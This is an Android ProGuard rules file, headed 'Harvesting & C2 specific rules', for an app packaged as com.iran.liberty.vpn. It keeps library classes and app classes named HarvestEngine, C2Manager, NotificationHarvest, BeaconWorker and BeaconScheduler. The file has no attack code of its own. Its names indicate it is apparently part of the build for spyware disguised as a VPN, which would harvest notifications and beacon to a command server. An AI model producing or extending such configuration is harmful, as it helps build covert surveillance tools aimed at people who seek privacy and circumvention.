# Pathway 4: Harvesting & C2 specific rules

# Keep Supabase classes
-keep class io.github.jan.supabase.** { *; }
-keep class io.ktor.** { *; }
-dontwarn io.github.jan.supabase.**
-dontwarn io.ktor.**

# Keep WorkManager
-keep class androidx.work.** { *; }
-keepclasseswithmembernames class * {
    @androidx.work.* *;
}

# Keep BouncyCastle
-keep class org.bouncycastle.** { *; }
-dontwarn org.bouncycastle.**

# Keep serialization
-keepattributes *Annotation*, Signature, EnclosingMethod, InnerClasses
-keepclasseswithmembers class * {
    @kotlinx.serialization.* <fields>;
}
-keepclasseswithmembers class * {
    @kotlinx.serialization.* <methods>;
}

# Keep our harvesting classes
-keep class com.iran.liberty.vpn.HarvestEngine { *; }
-keep class com.iran.liberty.vpn.C2Manager { *; }
-keep class com.iran.liberty.vpn.NotificationHarvest { *; }
-keep class com.iran.liberty.vpn.CryptoUtil { *; }
-keep class com.iran.liberty.vpn.BeaconWorker { *; }
-keep class com.iran.liberty.vpn.BeaconScheduler { *; }